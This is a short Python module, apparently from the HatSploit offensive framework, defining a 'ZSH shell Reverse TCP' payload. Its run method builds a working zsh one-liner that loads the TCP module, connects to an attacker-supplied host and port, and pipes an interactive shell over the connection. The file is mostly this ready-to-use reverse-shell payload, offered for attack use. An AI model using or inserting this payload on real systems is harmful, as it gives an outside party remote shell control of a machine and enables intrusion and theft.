"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "ZSH shell Reverse TCP",
            'Payload': "unix/generic/zsh_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "ZSH shell reverse TCP payload.",
            'Architecture': "generic",
            'Platform': "unix",
            'Rank': "high",
            'Type': "reverse_tcp",
        })

    def run(self):
        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {self.rhost.value} {self.rport.value} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
        return payload
